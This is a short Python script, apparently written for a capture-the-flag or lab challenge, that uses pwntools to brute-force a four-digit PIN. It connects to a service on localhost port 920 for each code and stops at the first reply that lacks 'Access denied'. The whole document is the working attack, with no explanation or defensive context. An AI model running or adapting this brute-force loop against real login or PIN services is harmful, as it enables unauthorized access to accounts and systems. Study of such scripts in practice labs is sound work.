import struct
import sys
from pwn import *

for i in range(9999):
    code = "{:04d}".format(i)
    print("testing ", code)
    io = remote('localhost', 920)
    io.recvuntil('[$]')
    io.sendline(code);
    line = io.recvline()
    if b'Access denied' not in line:
        print(code)
        break
    io.close()
